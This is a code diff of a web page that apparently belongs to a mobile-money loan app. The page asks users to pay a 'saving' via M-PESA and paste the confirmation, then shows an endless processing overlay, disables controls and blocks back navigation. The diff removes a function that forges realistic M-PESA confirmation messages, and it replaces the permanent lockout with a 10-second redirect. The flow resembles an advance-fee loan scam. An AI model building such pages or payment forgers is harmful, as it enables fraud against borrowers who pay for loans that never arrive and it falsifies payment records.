@@ -279,7 +279,7 @@
   <div class="loading-overlay" id="loadingOverlay">
     <div class="spinner"></div>
     <div class="loading-text">processing ...</div>
-    <div class="loading-sub">Ensure your savings are sent · please wait</div>
+    <div class="loading-sub">Verifying payment · please wait</div>
     <div class="loading-sub" style="margin-top: 1rem; font-size: 0.85rem;"><i class="fas fa-lock"></i>  verification</div>
   </div>
 
@@ -306,18 +306,13 @@
       <div class="mpesa-card">
         <i class="fas fa-check-circle" style="color: #2b7a4b; font-size: 1.6rem; margin-bottom: 8px; display: block;"></i>
         
-        <!-- Empty textarea for user to paste M-PESA message (English placeholder) -->
-        <textarea id="mpesaPasteArea" class="message-area" placeholder="✧  ✧"></textarea>
+        <!-- Empty textarea for user to paste M-PESA message -->
+        <textarea id="mpesaPasteArea" class="message-area" placeholder="✧ paste your M-PESA confirmation here ✧"></textarea>
         
-        <!-- The instruction line has been removed as requested -->
+        <!-- The instruction line has been removed -->
       </div>
 
-      <!-- Copy button for a predefined message (English label) -->
-      <div style="margin: 0.5rem 0 0.8rem;">
-       
-      </div>
-
-      <!-- English button text - now triggers continuous loading overlay after validation -->
+      <!-- English button text - triggers validation + overlay + redirect after 10s -->
       <button class="btn-primary" id="verifyPaymentBtn"><i class="fas fa-thumbs-up"></i> I have paid, give me loan</button>
       
       <button class="btn-outline" id="backToDashboardBtn"><i class="fas fa-arrow-left"></i> back to dashboard</button>
@@ -345,33 +340,6 @@
 
       const savingAmount = parseFloat(saving).toFixed(2);          // e.g. "100.00"
       const expectedInstitution = "HAKIKA R PROVISION";
-
-      // Generate a realistic sample message with random transaction ID and current date/time
-      function generateSampleMessage() {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        let transId = '';
-        for (let i = 0; i < 10; i++) {
-          transId += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        const date = new Date();
-        const formattedDate = `${date.getMonth()+1}/${date.getDate()}/${date.getFullYear().toString().slice(2)}`;
-        const hours = date.getHours();
-        const minutes = date.getMinutes();
-        const ampm = hours >= 12 ? 'PM' : 'AM';
-        const formattedHours = hours % 12 || 12;
-        const timeStr = `${formattedHours}:${minutes.toString().padStart(2,'0')} ${ampm}`;
-        return `${transId} Confirmed. Ksh${savingAmount} paid to ${expectedInstitution}. on ${formattedDate} at ${timeStr}. New M-PESA balance is Ksh0.00. Transaction cost, Ksh0.00. Amount you can transact within the day is 499,931.00. Save frequent Tills for quick payment on M-PESA app https://bit.ly/mpesalnk`;
-      }
-
-      // Copy sample button
-      document.getElementById('copySampleBtn').addEventListener('click', function() {
-        const sample = generateSampleMessage();
-        navigator.clipboard.writeText(sample).then(() => {
-          alert('✅ sample copied! paste it into the message area.');
-        }).catch(() => {
-          prompt('copy manually:', sample);
-        });
-      });
 
       // loading overlay elements
       const loadingOverlay = document.getElementById('loadingOverlay');
@@ -407,7 +375,7 @@
         }, 1500);
       }
 
-      // Main button: validates message, then activates continuous overlay
+      // Main button: validates message, then activates continuous overlay + redirect after 10s
       document.getElementById('verifyPaymentBtn').addEventListener('click', function() {
         const pasted = document.getElementById('mpesaPasteArea').value.trim();
         if (!pasted) {
@@ -425,7 +393,7 @@
         loadingOverlay.classList.add('active');
         bodyEl.classList.add('loading-active');
         
-        // Disable all interactive elements (buttons, textarea) – visually via CSS, plus explicitly
+        // Disable all interactive elements (buttons, textarea)
         document.querySelectorAll('button, textarea, input').forEach(el => {
           el.disabled = true;
         });
@@ -433,7 +401,7 @@
         // Start blocking back navigation
         enableBackBlocker();
 
-        // Simulate continuous processing message rotation (just for visual feedback)
+        // Rotate status messages while loading
         let counter = 0;
         const subEl = document.querySelector('.loading-sub');
         const intervalMsg = setInterval(() => {
@@ -451,13 +419,17 @@
           }
         }, 3500);
 
-        // The overlay remains active indefinitely – continuous loading.
-        // There is no automatic redirect. The user stays in this state forever.
+        // ---- REDIRECT AFTER 10 SECONDS ----
+        setTimeout(() => {
+          // Only redirect if overlay is still active (i.e., not manually removed)
+          if (loadingOverlay.classList.contains('active')) {
+            window.location.href = 'dashboard.html';
+          }
+        }, 10000); // 10 seconds
       });
 
-      // Back to dashboard button – only works if overlay is NOT active (overlay disables pointer events)
+      // Back to dashboard button – only works if overlay is NOT active
       document.getElementById('backToDashboardBtn').addEventListener('click', function() {
-        // If overlay somehow active, prevent (but button should be non-clickable due to CSS)
         if (!loadingOverlay.classList.contains('active')) {
           window.location.href = 'dashboard.html';
         }
@@ -466,7 +438,6 @@
       // Prevent accidental refresh or exit attempts with warning (optional)
       window.addEventListener('beforeunload', function(e) {
         if (loadingOverlay.classList.contains('active')) {
-          // Standard warning
           e.preventDefault();
           e.returnValue = '';
           return '';
